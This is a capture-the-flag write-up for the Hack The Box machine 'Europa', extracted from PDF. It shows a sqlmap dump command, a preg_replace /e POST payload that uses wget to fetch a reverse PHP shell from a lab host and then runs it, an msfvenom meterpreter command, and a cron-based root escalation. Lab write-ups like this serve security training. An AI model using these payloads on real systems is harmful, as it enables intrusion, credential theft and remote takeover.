@@ -1,0 +1,85 @@
+Europa
+
+5th October 2017 / Document No D17.100.09
+
+Prepared By: Alexander Reid (Arrexel)
+Machine Author: ch4p
+Difficulty: Medium
+Classification: Official
+
+                                                                         Page 1 / 7
+SYNOPSIS
+
+Europa can present a bit of a challenge, or can be quite easy, depending on if you know what to
+look for. While it does not require many steps to complete, it provides a great learning
+experience in several fairly uncommon enumeration techniques and attack vectors.
+
+Skills Required                       Skills Learned
+
+     Understanding of SQL injections       Enumerating SSL certificates and
+     Understanding of common PHP               Apache virtual hosts
+
+         functions                         Exploiting PHP's preg_replace function
+                                           Bypassing restrictive write permissions
+
+                                      Page 2 / 7
+Enumeration
+Nmap
+
+Nmap on reveals OpenSSH and an Apache server, which appears to support HTTPS/SSL.
+Attempting to browse to either web server port presents the default Ubuntu Apache installation
+page. Attempting to fuzz for files and directories yields no results.
+
+                                                                                                                   Page 3 / 7
+SSLyze
+
+Due to the lack of an attack vector, but the presence of SSL, it is a good idea at this point to have
+a look at the SSL certificate to see if any information can be gained about a potential hostname
+that must be used with the Apache virtual host. Running sslyze --regular 10.10.10.22 produces
+two domain names: w ww.europacorp.htb a nd a dmin-portal.europacorp.htb
+
+By adding a dmin-portal.europacorp.htb to the / etc/hosts file and browsing to the domain, a
+login page has been discovered when accessing the SSL version of the site.
+
+                                                                                                                   Page 4 / 7
+Exploitation
+Login Page
+
+After a bit of trial and error, it is clear that the login page is vulnerable to SQL injection. Running
+SQLMap against the page will dump the password MD5 hashes and usernames. The hashes can
+easily be looked up with an online hash lookup such as hashkiller.co.uk
+Command: s qlmap -u "https://admin-portal.europacorp.htb/login.php" --data
+"email=admin@europacorp.htb&password=" --risk=3 --level=3 --dbms "MYSQL" --dump-all
+
+                                                                                                                   Page 5 / 7
+Tools
+
+Once on the tools page, it appears that it replaces all occurrences of ip_address with a
+user-specified string. By examining the POST data using Burpsuite, it appears that the regex can
+be set client-side.
+
+It can be assumed that the p attern variable is used in preg_replace in the code, which can be
+easily exploited. Refer to the linked article for more information on how this exploit works.
+Exploit Information: h ttp://www.madirish.net/402
+By setting POST data to pattern=/^(.*)/e&ipaddress=system(`wget http://10.10.14.5/writeup.php
+-P /tmp`);&text=test it will pull a reverse PHP shell from a local webserver and save it in the tmp
+directory. Sending pattern=/^(.*)/e&ipaddress=system(`php -f /tmp/writeup.php`);&text=test will
+then execute the file.
+Msfvenom command: msfvenom -p php/meterpreter/reverse_tcp lhost=<LAB IP> lport=<PORT>
+-f raw > writeup.php
+
+                                                                                                                   Page 6 / 7
+Privilege Escalation
+
+LinEnum: https://github.com/rebootuser/LinEnum
+As it is not possible to write to the web directory, even as www-data, the /tmp directory remains
+unrestricted. Uploading and running LinEnum gathers a large amount of information about the
+target.
+Looking at /etc/crontab, it appears that / var/www/cronjobs/clearlogs is run every minute.
+Examining the clearlogs file shows that / var/www/cmd/logcleared.sh is executed by this PHP
+script. The l ogcleared.sh file does not exist however, and the directory is writable by www-data.
+By creating a script and naming it logcleared.sh, it is possible to extract the root flag. Don't forget
+to chmod +x the script!
+
+                                                                                                                   Page 7 / 7
+
